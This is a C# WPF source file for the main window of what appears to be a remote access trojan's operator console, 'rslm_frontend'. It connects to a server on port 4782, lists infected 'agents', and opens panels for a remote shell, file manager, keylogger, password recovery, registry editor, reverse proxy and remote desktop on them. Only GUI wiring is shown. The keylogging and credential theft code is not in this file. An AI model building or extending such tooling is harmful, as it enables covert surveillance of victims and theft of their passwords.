using Newtonsoft.Json.Linq;
using rslm_frontend.Services;
using rslm_frontend.ViewModels;
using rslm_frontend.Views;
using System;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;

namespace rslm_frontend
{
    public partial class MainWindow : Window
    {
        private readonly RslmTcpClient _tcp;
        private string _selectedAgentId;
        private Button _connectBtn;

        public MainWindow()
        {
            InitializeComponent();
            ThemeManager.Initialize();
            UpdateThemeButtons();
            _tcp = new RslmTcpClient("127.0.0.1", 4782);

            _tcp.AgentConnected += (id, tag) =>
            {
                Dispatcher.Invoke(() =>
                {
                    AddAgent(id, tag);
                    Log($"✅ Agent connected: {id}");
                    UpdateStatus($"Agent: {id}");
                });
            };

            _tcp.MessageReceived += msg =>
            {
                Dispatcher.Invoke(() =>
                {
                    Log($"📩 Received: {msg.ToString(Newtonsoft.Json.Formatting.None)}");
                });
            };
        }

        private void UpdateThemeButtons()
        {
            var current = ThemeManager.CurrentTheme;
            DarkThemeBtn.IsChecked = (current == AppTheme.Dark);
            LightThemeBtn.IsChecked = (current == AppTheme.Light);
            SystemThemeBtn.IsChecked = (current == AppTheme.System);
        }

        private void ThemeButton_Checked(object sender, RoutedEventArgs e)
        {
            var btn = sender as RadioButton;
            if (btn == null) return;

            switch (btn.Tag.ToString())
            {
                case "Dark":
                    ThemeManager.SetTheme(AppTheme.Dark);
                    break;
                case "Light":
                    ThemeManager.SetTheme(AppTheme.Light);
                    break;
                case "System":
                    ThemeManager.SetTheme(AppTheme.System);
                    break;
            }

            UpdateThemeButtons();
        }

        private void AddAgent(string id, string tag)
        {
            var headerPanel = new StackPanel { Orientation = Orientation.Horizontal };
            headerPanel.Children.Add(new TextBlock
            {
                Text = "\uE77B",
                FontFamily = new FontFamily("Segoe MDL2 Assets"),
                Foreground = new SolidColorBrush(Color.FromRgb(0xD4, 0xD4, 0xD4)),
                Margin = new Thickness(0, 0, 6, 0)
            });
            headerPanel.Children.Add(new TextBlock
            {
                Text = tag ?? id,
                Foreground = new SolidColorBrush(Color.FromRgb(0xD4, 0xD4, 0xD4))
            });

            var item = new TreeViewItem
            {
                Header = headerPanel,
                Tag = id
            };
            ExplorerTree.Items.Add(item);
        }

        private async void Connect_Click(object sender, RoutedEventArgs e)
        {
            var btn = sender as Button;
            _connectBtn = btn;
            btn.IsEnabled = false;
            SetButtonText(btn, "\uE768", "Connexion...", "White");
            Log("🔗 Connecting to 127.0.0.1:4782...");

            if (await _tcp.ConnectAsync())
            {
                SetButtonText(btn, "\uE768", "Connected", "White");
                Log("✅ Connected to server!");
                UpdateStatus("Connected");
            }
            else
            {
                SetButtonText(btn, "\uE768", "Connect", "White");
                btn.IsEnabled = true;
                Log("❌ Connection failed");
                UpdateStatus("Disconnected");
            }
        }

        private void Disconnect_Click(object sender, RoutedEventArgs e)
        {
            _tcp.Disconnect();

            if (_connectBtn != null)
            {
                SetButtonText(_connectBtn, "\uE768", "Connect", "White");
                _connectBtn.IsEnabled = true;
            }

            ExplorerTree.Items.Clear();
            _selectedAgentId = null;
            Log("❌ Disconnected from server");
            UpdateStatus("Disconnected");
        }

        private void SetButtonText(Button btn, string icon, string text, string iconColor = "#D4D4D4")
        {
            if (btn?.Content is StackPanel sp && sp.Children.Count >= 2)
            {
                if (sp.Children[0] is TextBlock iconBlock)
                    iconBlock.Text = icon;
                if (sp.Children[1] is TextBlock textBlock)
                    textBlock.Text = text;
            }
        }

        private void OpenShell_Click(object sender, RoutedEventArgs e)
        {
            EnsureSelectedAgent();

            var shell = new RemoteShellView();
            shell.DataContext = new RemoteShellViewModel(_tcp, _selectedAgentId, (src, msg) => Log($"[{src}] {msg}"));
            var doc = new AvalonDock.Layout.LayoutDocument
            {
                Title = $"Shell - {_selectedAgentId}",
                Content = shell
            };
            DocumentPane.Children.Add(doc);
            doc.IsActive = true;
            Log($"🐚 Shell opened for {_selectedAgentId}");
        }

        private void OpenFileManager_Click(object sender, RoutedEventArgs e)
        {
            EnsureSelectedAgent();

            var fm = new FileManagerView();
            fm.DataContext = new FileManagerViewModel(_tcp, _selectedAgentId, (src, msg) => Log($"[{src}] {msg}"));
            var doc = new AvalonDock.Layout.LayoutDocument
            {
                Title = $"Files - {_selectedAgentId}",
                Content = fm
            };
            DocumentPane.Children.Add(doc);
            doc.IsActive = true;
            Log($"📁 File Manager opened for {_selectedAgentId}");
        }

        private void OpenTaskManager_Click(object sender, RoutedEventArgs e)
        {
            EnsureSelectedAgent();

            var tm = new TaskManagerView();
            tm.DataContext = new TaskManagerViewModel(_tcp, _selectedAgentId, (src, msg) => Log($"[{src}] {msg}"));
            var doc = new AvalonDock.Layout.LayoutDocument
            {
                Title = $"Tasks - {_selectedAgentId}",
                Content = tm
            };
            DocumentPane.Children.Add(doc);
            doc.IsActive = true;
            Log($"📊 Task Manager opened for {_selectedAgentId}");
        }

        private void OpenSystemInfo_Click(object sender, RoutedEventArgs e)
        {
            EnsureSelectedAgent();

            var si = new SystemInfoView();
            si.DataContext = new SystemInfoViewModel(_tcp, _selectedAgentId, (src, msg) => Log($"[{src}] {msg}"));
            var doc = new AvalonDock.Layout.LayoutDocument
            {
                Title = $"System Info - {_selectedAgentId}",
                Content = si
            };
            DocumentPane.Children.Add(doc);
            doc.IsActive = true;
            Log($"ℹ System Info opened for {_selectedAgentId}");
        }

        private void OpenKeylogger_Click(object sender, RoutedEventArgs e)
        {
            EnsureSelectedAgent();

            var kl = new KeyloggerView();
            kl.DataContext = new KeyloggerViewModel(_tcp, _selectedAgentId, (src, msg) => Log($"[{src}] {msg}"));
            var doc = new AvalonDock.Layout.LayoutDocument
            {
                Title = $"Keylogger - {_selectedAgentId}",
                Content = kl
            };
            DocumentPane.Children.Add(doc);
            doc.IsActive = true;
            Log($"⌨ Keylogger opened for {_selectedAgentId}");
        }

        private void OpenPasswordRecovery_Click(object sender, RoutedEventArgs e)
        {
            EnsureSelectedAgent();

            var pr = new PasswordRecoveryView();
            pr.DataContext = new PasswordRecoveryViewModel(_tcp, _selectedAgentId, (src, msg) => Log($"[{src}] {msg}"));
            var doc = new AvalonDock.Layout.LayoutDocument
            {
                Title = $"Passwords - {_selectedAgentId}",
                Content = pr
            };
            DocumentPane.Children.Add(doc);
            doc.IsActive = true;
            Log($"🔑 Password Recovery opened for {_selectedAgentId}");
        }

        private void OpenRegistryEditor_Click(object sender, RoutedEventArgs e)
        {
            EnsureSelectedAgent();

            var re = new RegistryEditorView();
            re.DataContext = new RegistryEditorViewModel(_tcp, _selectedAgentId, (src, msg) => Log($"[{src}] {msg}"));
            var doc = new AvalonDock.Layout.LayoutDocument
            {
                Title = $"Registry - {_selectedAgentId}",
                Content = re
            };
            DocumentPane.Children.Add(doc);
            doc.IsActive = true;
            Log($"📋 Registry Editor opened for {_selectedAgentId}");
        }

        private void OpenReverseProxy_Click(object sender, RoutedEventArgs e)
        {
            EnsureSelectedAgent();

            var rp = new ReverseProxyView();
            rp.DataContext = new ReverseProxyViewModel(_tcp, _selectedAgentId, (src, msg) => Log($"[{src}] {msg}"));
            var doc = new AvalonDock.Layout.LayoutDocument
            {
                Title = $"Proxy - {_selectedAgentId}",
                Content = rp
            };
            DocumentPane.Children.Add(doc);
            doc.IsActive = true;
            Log($"🔄 Reverse Proxy opened for {_selectedAgentId}");
        }

        private void OpenRemoteDesktop_Click(object sender, RoutedEventArgs e)
        {
            EnsureSelectedAgent();

            var rdView = new RemoteDesktopView();
            rdView.DataContext = new RemoteDesktopViewModel(_tcp, _selectedAgentId, (src, msg) => Log($"[{src}] {msg}"));
            var doc = new AvalonDock.Layout.LayoutDocument
            {
                Title = $"Desktop - {_selectedAgentId}",
                Content = rdView
            };
            DocumentPane.Children.Add(doc);
            doc.IsActive = true;
            Log($"🖥 Remote Desktop opened for {_selectedAgentId}");
        }

        private void EnsureSelectedAgent()
        {
            if (string.IsNullOrEmpty(_selectedAgentId) && ExplorerTree.Items.Count > 0)
            {
                var first = ExplorerTree.Items[0] as TreeViewItem;
                _selectedAgentId = first?.Tag?.ToString() ?? "";
            }
        }

        private void ExplorerTree_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            if (ExplorerTree.SelectedItem is TreeViewItem item)
            {
                _selectedAgentId = item.Tag?.ToString() ?? "";
                OpenShell_Click(sender, e);
            }
        }

        private void Log(string msg)
        {
            Dispatcher.Invoke(() =>
            {
                OutputBox.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
                OutputBox.ScrollToEnd();
            });
        }

        private void UpdateStatus(string text)
        {
            Dispatcher.Invoke(() =>
            {
                if (StatusBar1.Items.Count > 0)
                    ((StatusBarItem)StatusBar1.Items[0]).Content = $"● {text}";
            });
        }

        private void TitleBar_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left) DragMove();
        }

        private void MinimizeButton_Click(object sender, RoutedEventArgs e) => WindowState = WindowState.Minimized;

        private void MaximizeButton_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
        }

        private void CloseButton_Click(object sender, RoutedEventArgs e) => Close();
    }
}